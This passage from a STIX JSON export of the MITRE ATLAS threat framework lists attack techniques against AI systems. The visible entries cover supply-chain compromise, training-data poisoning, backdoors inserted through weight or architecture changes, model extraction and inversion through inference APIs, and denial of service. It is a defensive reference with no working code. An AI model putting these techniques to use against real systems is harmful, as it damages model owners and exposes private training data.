"attack-pattern--f0725321-e7a4-476c-aef3-ea72ec6d29b8", "created": "2025-08-12T19:58:34.746941Z", "modified": "2025-08-12T19:58:34.746941Z", "name": "Hardware", "description": "Adversaries may target AI systems by disrupting or manipulating the hardware supply chain. AI models often run on specialized hardware such as GPUs, TPUs, or embedded devices, but may also be optimized to operate on CPUs.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0010.000", "external_id": "AML.T0010.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--8128388c-cca0-4c81-bbe5-d3421ac5d3df", "created": "2025-08-12T19:58:34.747078Z", "modified": "2025-08-12T19:58:34.747078Z", "name": "AI Software", "description": "Most AI systems rely on a limited set of AI frameworks.\nAn adversary could get access to a large number of AI systems through a comprise of one of their supply chains.\nMany AI projects also rely on other open source implementations of various algorithms.\nThese can also be compromised in a targeted way to get access to specific systems.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0010.001", "external_id": "AML.T0010.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--13ecefc0-d955-42e5-8b6d-d3e3ff55a775", "created": "2025-08-12T19:58:34.747217Z", "modified": "2025-08-12T19:58:34.747217Z", "name": "Data", "description": "Data is a key vector of supply chain compromise for adversaries.\nEvery AI project will require some form of data.\nMany rely on large open source datasets that are publicly available.\nAn adversary could rely on compromising these sources of data.\nThe malicious data could be a result of [Poison Training Data](/techniques/AML.T0020) or include traditional malware.\n\nAn adversary can also target private datasets in the labeling phase.\nThe creation of private datasets will often require the hiring of outside labeling services.\nAn adversary can poison a dataset by modifying the labels being generated by the labeling service.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0010.002", "external_id": "AML.T0010.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--c63744cb-a84e-4ed1-93f4-efa757770e66", "created": "2025-08-12T19:58:34.747354Z", "modified": "2025-08-12T19:58:34.747354Z", "name": "Model", "description": "AI-enabled systems often rely on open sourced models in various ways.\nMost commonly, the victim organization may be using these models for fine tuning.\nThese models will be downloaded from an external source and then used as the base for the model as it is tuned on a smaller, private dataset.\nLoading models often requires executing some saved code in the form of a saved model file.\nThese can be compromised with traditional malware, or through some adversarial AI techniques.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0010.003", "external_id": "AML.T0010.003"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--62f636dd-9f62-4f22-adc2-471c3f061e9d", "created": "2025-08-12T19:58:34.747503Z", "modified": "2025-08-12T19:58:34.747503Z", "name": "AI Model Inference API Access", "description": "Adversaries may gain access to a model via legitimate access to the inference API.\nInference API access can be a source of information to the adversary ([Discover AI Model Ontology](/techniques/AML.T0013), [Discover AI Model Family](/techniques/AML.T0014)), a means of staging the attack ([Verify Attack](/techniques/AML.T0042), [Craft Adversarial Data](/techniques/AML.T0043)), or for introducing data to the target system for Impact ([Evade AI Model](/techniques/AML.T0015), [Erode AI Model Integrity](/techniques/AML.T0031)).\n\nMany systems rely on the same models provided via an inference API, which means they share the same vulnerabilities. This is especially true of foundation models which are prohibitively resource intensive to train. Adversaries may use their access to model APIs to identify vulnerabilities such as jailbreaks or hallucinations and then target applications that use the same models.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-model-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0040", "external_id": "AML.T0040"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--1b9b6889-8f46-4417-a45f-d470ac8f002b", "created": "2025-08-12T19:58:34.74759Z", "modified": "2025-08-12T19:58:34.74759Z", "name": "AI-Enabled Product or Service", "description": "Adversaries may use a product or service that uses artificial intelligence under the hood to gain access to the underlying AI model.\nThis type of indirect model access may reveal details of the AI model or its inferences in logs or metadata.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-model-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0047", "external_id": "AML.T0047"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--f5b5647e-6823-4f76-9c33-735da7fb37d3", "created": "2025-08-12T19:58:34.747675Z", "modified": "2025-08-12T19:58:34.747675Z", "name": "Physical Environment Access", "description": "In addition to the attacks that take place purely in the digital domain, adversaries may also exploit the physical environment for their attacks.\nIf the model is interacting with data collected from the real world in some way, the adversary can influence the model through access to wherever the data is being collected.\nBy modifying the data in the collection process, the adversary can perform modified versions of attacks designed for digital access.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-model-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0041", "external_id": "AML.T0041"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--65a7290b-006b-4961-b51f-9aa0b132fab3", "created": "2025-08-12T19:58:34.747762Z", "modified": "2025-08-12T19:58:34.747762Z", "name": "Full AI Model Access", "description": "Adversaries may gain full \"white-box\" access to an AI model.\nThis means the adversary has complete knowledge of the model architecture, its parameters, and class ontology.\nThey may exfiltrate the model to [Craft Adversarial Data](/techniques/AML.T0043) and [Verify Attack](/techniques/AML.T0042) in an offline where it is hard to detect their behavior.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-model-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0044", "external_id": "AML.T0044"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--d14c8181-1bb2-4c82-b5ea-daacee09aa16", "created": "2025-08-12T19:58:34.747848Z", "modified": "2025-08-12T19:58:34.747848Z", "name": "Discover AI Model Ontology", "description": "Adversaries may discover the ontology of an AI model's output space, for example, the types of objects a model can detect.\nThe adversary may discovery the ontology by repeated queries to the model, forcing it to enumerate its output space.\nOr the ontology may be discovered in a configuration file or in documentation about the model.\n\nThe model ontology helps the adversary understand how the model is being used by the victim.\nIt is useful to the adversary in creating targeted attacks.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0013", "external_id": "AML.T0013"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--7da2c306-0c7b-4ca4-80d0-8235cc6cd588", "created": "2025-08-12T19:58:34.747934Z", "modified": "2025-08-12T19:58:34.747934Z", "name": "Discover AI Model Family", "description": "Adversaries may discover the general family of model.\nGeneral information about the model may be revealed in documentation, or the adversary may use carefully constructed examples and analyze the model's responses to categorize it.\n\nKnowledge of the model family can help the adversary identify means of attacking the model and help tailor the attack.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0014", "external_id": "AML.T0014"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--85945825-054e-4581-b95c-767be68d1af9", "created": "2025-08-12T19:58:34.748031Z", "modified": "2025-08-12T19:58:34.748031Z", "name": "Poison Training Data", "description": "Adversaries may attempt to poison datasets used by an AI model by modifying the underlying data or its labels.\nThis allows the adversary to embed vulnerabilities in AI models trained on the data that may not be easily detectable.\nData poisoning attacks may or may not require modifying the labels.\nThe embedded vulnerability is activated at a later time by data samples with an [Insert Backdoor Trigger](/techniques/AML.T0043.004)\n\nPoisoned data can be introduced via [AI Supply Chain Compromise](/techniques/AML.T0010) or the data may be poisoned after the adversary gains [Initial Access](/tactics/AML.TA0004) to the system.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}, {"kill_chain_name": "mitre-atlas", "phase_name": "persistence"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0020", "external_id": "AML.T0020"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--e1822c47-4d18-45c4-9612-047e53864eb4", "created": "2025-08-12T19:58:34.748115Z", "modified": "2025-08-12T19:58:34.748115Z", "name": "Establish Accounts", "description": "Adversaries may create accounts with various services for use in targeting, to gain access to resources needed in [AI Attack Staging](/tactics/AML.TA0001), or for victim impersonation.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0021", "external_id": "AML.T0021"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--673c47c6-1620-4fd8-b49b-6d81a14d17cd", "created": "2025-08-12T19:58:34.7482Z", "modified": "2025-08-12T19:58:34.7482Z", "name": "Create Proxy AI Model", "description": "Adversaries may obtain models to serve as proxies for the target model in use at the victim organization.\nProxy models are used to simulate complete access to the target model in a fully offline manner.\n\nAdversaries may train models from representative datasets, attempt to replicate models from victim inference APIs, or use available pre-trained models.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0005", "external_id": "AML.T0005"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--fe9d87d1-bb0a-4f57-9d69-9d2aacc19941", "created": "2025-08-12T19:58:34.748275Z", "modified": "2025-08-12T19:58:34.748275Z", "name": "Train Proxy via Gathered AI Artifacts", "description": "Proxy models may be trained from AI artifacts (such as data, model architectures, and pre-trained models) that are representative of the target model gathered by the adversary.\nThis can be used to develop attacks that require higher levels of access than the adversary has available or as a means to validate pre-existing attacks without interacting with the target model.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0005.000", "external_id": "AML.T0005.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--15798faf-f127-4af1-a39f-a2987b6893b4", "created": "2025-08-12T19:58:34.748417Z", "modified": "2025-08-12T19:58:34.748417Z", "name": "Train Proxy via Replication", "description": "Adversaries may replicate a private model.\nBy repeatedly querying the victim's [AI Model Inference API Access](/techniques/AML.T0040), the adversary can collect the target model's inferences into a dataset.\nThe inferences are used as labels for training a separate model offline that will mimic the behavior and performance of the target model.\n\nA replicated model that closely mimic's the target model is a valuable resource in staging the attack.\nThe adversary can use the replicated model to [Craft Adversarial Data](/techniques/AML.T0043) for various purposes (e.g. [Evade AI Model](/techniques/AML.T0015), [Spamming AI System with Chaff Data](/techniques/AML.T0046)).\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0005.001", "external_id": "AML.T0005.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--ff764f50-dce3-4bbd-83fb-7b0a0df20e88", "created": "2025-08-12T19:58:34.748559Z", "modified": "2025-08-12T19:58:34.748559Z", "name": "Use Pre-Trained Model", "description": "Adversaries may use an off-the-shelf pre-trained model as a proxy for the victim model to aid in staging the attack.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0005.002", "external_id": "AML.T0005.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--b03e5d58-e4ab-4377-8fea-2a506d3a13ed", "created": "2025-08-12T19:58:34.748711Z", "modified": "2025-08-12T19:58:34.748711Z", "name": "Discover AI Artifacts", "description": "Adversaries may search private sources to identify AI learning artifacts that exist on the system and gather information about them.\nThese artifacts can include the software stack used to train and deploy models, training and testing data management systems, container registries, software repositories, and model zoos.\n\nThis information can be used to identify targets for further collection, exfiltration, or disruption, and to tailor and improve attacks.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0007", "external_id": "AML.T0007"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--36e33591-e21d-43cd-aa32-a2ad2c9e8d1e", "created": "2025-08-12T19:58:34.7488Z", "modified": "2025-08-12T19:58:34.7488Z", "name": "User Execution", "description": "An adversary may rely upon specific actions by a user in order to gain execution.\nUsers may inadvertently execute unsafe code introduced via [AI Supply Chain Compromise](/techniques/AML.T0010).\nUsers may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "execution"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0011", "external_id": "AML.T0011"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--713db620-da51-4bd0-9496-d03c2e2e0564", "created": "2025-08-12T19:58:34.748875Z", "modified": "2025-08-12T19:58:34.748875Z", "name": "Unsafe AI Artifacts", "description": "Adversaries may develop unsafe AI artifacts that when executed have a deleterious effect.\nThe adversary can use this technique to establish persistent access to systems.\nThese models may be introduced via a [AI Supply Chain Compromise](/techniques/AML.T0010).\n\nSerialization of models is a popular technique for model storage, transfer, and loading.\nHowever, this format without proper checking presents an opportunity for code execution.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "execution"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0011.000", "external_id": "AML.T0011.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--6923abee-06a8-4fcd-853e-d0a1e374490f", "created": "2025-08-12T19:58:34.749026Z", "modified": "2025-08-12T19:58:34.749026Z", "name": "Valid Accounts", "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.\nCredentials may take the form of usernames and passwords of individual user accounts or API keys that provide access to various AI resources and services.\n\nCompromised credentials may provide access to additional AI artifacts and allow the adversary to perform [Discover AI Artifacts](/techniques/AML.T0007).\nCompromised credentials may also grant an adversary increased privileges such as write access to AI artifacts used during development or production.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0012", "external_id": "AML.T0012"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--617a8d41-f0fd-4b88-a6c2-66fa5ca45efd", "created": "2025-08-12T19:58:34.749137Z", "modified": "2025-08-12T19:58:34.749137Z", "name": "Evade AI Model", "description": "Adversaries can [Craft Adversarial Data](/techniques/AML.T0043) that prevent a AI model from correctly identifying the contents of the data.\nThis technique can be used to evade a downstream task where AI is utilized.\nThe adversary may evade AI based virus/malware detection, or network scanning towards the goal of a traditional cyber attack.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}, {"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}, {"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0015", "external_id": "AML.T0015"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--cf6f094e-1011-4643-91f3-487ac2803aaf", "created": "2025-08-12T19:58:34.749237Z", "modified": "2025-08-12T19:58:34.749237Z", "name": "Manipulate AI Model", "description": "Adversaries may directly manipulate an AI model to change its behavior or introduce malicious code. Manipulating a model gives the adversary a persistent change in the system. This can include poisoning the model by changing its weights, modifying the model architecture to change its behavior, and embedding malware which may be executed when the model is loaded.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "persistence"}, {"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0018", "external_id": "AML.T0018"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--f4dfd872-4133-4dde-a901-433a9a0970a9", "created": "2025-08-12T19:58:34.749313Z", "modified": "2025-08-12T19:58:34.749313Z", "name": "Poison AI Model", "description": "Adversaries may manipulate an AI model's weights to change it's behavior or performance, resulting in a poisoned model.\nAdversaries may poison a model by by directly manipulating its weights, training the model on poisoned data, further fine-tuning the model, or otherwise interfering with its training process. \n\nThe change in behavior of poisoned models may be limited to targeted categories in predictive AI models, or targeted topics, concepts, or facts in generative AI models, or aim for a general performance degradation.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "persistence"}, {"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0018.000", "external_id": "AML.T0018.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--a2de5e8e-2a0a-4d64-81cf-4370131e5922", "created": "2025-08-12T19:58:34.749459Z", "modified": "2025-08-12T19:58:34.749459Z", "name": "Modify AI Model Architecture", "description": "Adversaries may directly modify an AI model's architecture to re-define it's behavior. This can include adding or removing layers as well as adding pre or post-processing operations.\n\nThe effects could include removing the ability to predict certain classes, adding erroneous operations to increase computation costs, or degrading performance. Additionally, a separate adversary-defined network could be injected into the computation graph, which can change the behavior based on the inputs, effectively creating a backdoor.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "persistence"}, {"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0018.001", "external_id": "AML.T0018.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--7a255ad9-ec2a-4520-bb72-fb407429eb2f", "created": "2025-08-12T19:58:34.749613Z", "modified": "2025-08-12T19:58:34.749613Z", "name": "Exfiltration via AI Inference API", "description": "Adversaries may exfiltrate private information via [AI Model Inference API Access](/techniques/AML.T0040).\nAI Models have been shown leak private information about their training data (e.g.  [Infer Training Data Membership](/techniques/AML.T0024.000), [Invert AI Model](/techniques/AML.T0024.001)).\nThe model itself may also be extracted ([Extract AI Model](/techniques/AML.T0024.002)) for the purposes of [AI Intellectual Property Theft](/techniques/AML.T0048.004).\n\nExfiltration of information relating to private training data raises privacy concerns.\nPrivate training data may include personally identifiable information, or other protected data.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "exfiltration"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0024", "external_id": "AML.T0024"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--4a6b746e-98fc-4c70-9025-31ada433aca5", "created": "2025-08-12T19:58:34.749693Z", "modified": "2025-08-12T19:58:34.749693Z", "name": "Infer Training Data Membership", "description": "Adversaries may infer the membership of a data sample in its training set, which raises privacy concerns.\nSome strategies make use of a shadow model that could be obtained via [Train Proxy via Replication](/techniques/AML.T0005.001), others use statistics of model prediction scores.\n\nThis can cause the victim model to leak private information, such as PII of those in the training set or other forms of protected IP.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "exfiltration"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0024.000", "external_id": "AML.T0024.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--9e5d356e-592e-4cbf-9354-44f3fbd3a38a", "created": "2025-08-12T19:58:34.749832Z", "modified": "2025-08-12T19:58:34.749832Z", "name": "Invert AI Model", "description": "AI models' training data could be reconstructed by exploiting the confidence scores that are available via an inference API.\nBy querying the inference API strategically, adversaries can back out potentially private information embedded within the training data.\nThis could lead to privacy violations if the attacker can reconstruct the data of sensitive features used in the algorithm.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "exfiltration"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0024.001", "external_id": "AML.T0024.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--9f3f1f1e-e34a-4349-ae97-9c0fb1e4d426", "created": "2025-08-12T19:58:34.749971Z", "modified": "2025-08-12T19:58:34.749971Z", "name": "Extract AI Model", "description": "Adversaries may extract a functional copy of a private model.\nBy repeatedly querying the victim's [AI Model Inference API Access](/techniques/AML.T0040), the adversary can collect the target model's inferences into a dataset.\nThe inferences are used as labels for training a separate model offline that will mimic the behavior and performance of the target model.\n\nAdversaries may extract the model to avoid paying per query in an artificial intelligence as a service (AIaaS) setting.\nModel extraction is used for [AI Intellectual Property Theft](/techniques/AML.T0048.004).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "exfiltration"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0024.002", "external_id": "AML.T0024.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--35d567af-54b2-4b13-ab9e-b77776967091", "created": "2025-08-12T19:58:34.75021Z", "modified": "2025-08-12T19:58:34.75021Z", "name": "Exfiltration via Cyber Means", "description": "Adversaries may exfiltrate AI artifacts or other information relevant to their goals via traditional cyber means.\n\nSee the ATT&CK [Exfiltration](https://attack.mitre.org/tactics/TA0010/) tactic for more information.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "exfiltration"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0025", "external_id": "AML.T0025"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--d37ba04b-06cc-4909-9990-33d1a24b4fc0", "created": "2025-08-12T19:58:34.750301Z", "modified": "2025-08-12T19:58:34.750301Z", "name": "Denial of AI Service", "description": "Adversaries may target AI-enabled systems with a flood of requests for the purpose of degrading or shutting down the service.\nSince many AI systems require significant amounts of specialized compute, they are often expensive bottlenecks that can become overloaded.\nAdversaries can intentionally craft inputs that require heavy amounts of useless compute from the AI system.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0029", "external_id": "AML.T0029"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--05041d9e-0ece-4f2f-b659-6c6136e34d12", "created": "2025-08-12T19:58:34.750388Z", "modified": "2025-08-12T19:58:34.750388Z", "name": "Spamming AI System with Chaff Data", "description": "Adversaries may spam the AI system with chaff data that causes increase in the number of detections.\nThis can cause analysts at the victim organization to waste time reviewing and correcting incorrect inferences.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0046", "external_id": "AML.T0046"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--711f66ad-d72b-4037-87a6-614a7ff9e000", "created": "2025-08-12T19:58:34.750476Z", "modified": "2025-08-12T19:58:34.750476Z", "name": "Erode AI Model Integrity", "description": "Adversaries may degrade the target model's performance with adversarial data inputs to erode confidence in the system over time.\nThis can lead to the victim organization wasting time and money both attempting to fix the system and performing the tasks it was meant to automate by hand.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0031", "external_id": "AML.T0031"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--56022f01-f3e9-442e-b1aa-8e2b50560d22", "created": "2025-08-12T19:58:34.750568Z", "modified": "2025-08-12T19:58:34.750568Z", "name": "Cost Harvesting", "description": "Adversaries may target different AI services to send useless queries or computationally expensive inputs to increase the cost of running services at the victim organization.\nSponge examples are a particular type of adversarial data designed to maximize energy consumption and thus operating cost.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0034", "external_id": "AML.T0034"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--a5d1adea-11f5-4ed0-94f3-78d19b40c8fd", "created": "2025-08-12T19:58:34.750655Z", "modified": "2025-08-12T19:58:34.750655Z", "name": "AI Artifact Collection", "description": "Adversaries may collect AI artifacts for [Exfiltration](/tactics/AML.TA0010) or for use in [AI Attack Staging](/tactics/AML.TA0001).\nAI artifacts include models and datasets as well as other telemetry data produced when interacting with a model.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "collection"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0035", "external_id": "AML.T0035"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--8f869719-7ecb-4135-8511-79c68f141a69", "created": "2025-08-12T19:58:34.750743Z", "modified": "2025-08-12T19:58:34.750743Z", "name": "Data from Information Repositories", "description": "Adversaries may leverage information repositories to mine valuable information.\nInformation repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\n\nInformation stored in a repository may vary based on the specific instance or environment.\nSpecific common information repositories include SharePoint, Confluence, and enterprise databases such as SQL Server.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "collection"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0036", "external_id": "AML.T0036"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--4cb7c83b-5627-4762-8323-91e08c480064", "created": "2025-08-12T19:58:34.750827Z", "modified": "2025-08-12T19:58:34.750827Z", "name": "Data from Local System", "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nThis can include basic fingerprinting information and sensitive data such as ssh keys.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "collection"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0037", "external_id": "AML.T0037"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--ea1fa6da-3fa9-40b4-be04-ea076a20ff0c", "created": "2025-08-12T19:58:34.750913Z", "modified": "2025-08-12T19:58:34.750913Z", "name": "Verify Attack", "description": "Adversaries can verify the efficacy of their attack via an inference API or access to an offline copy of the target model.\nThis gives the adversary confidence that their approach works and allows them to carry out the attack at a later time of their choosing.\nThe adversary may verify the attack once but use it against many edge devices running copies of the target model.\nThe adversary may verify their attack digitally, then deploy it in the [Physical Environment Access](/techniques/AML.T0041) at a later time.\nVerifying the attack may be hard to detect since the adversary can use a minimal number of queries or an offline copy of the model.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0042", "external_id": "AML.T0042"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--c8f02784-46a0-4d87-8836-bd0eaccbc4cb", "created": "2025-08-12T19:58:34.750999Z", "modified": "2025-08-12T19:58:34.750999Z", "name": "Craft Adversarial Data", "description": "Adversarial data are inputs to an AI model that have been modified such that they cause the adversary's desired effect in the target model.\nEffects can range from misclassification, to missed detections, to maximizing energy 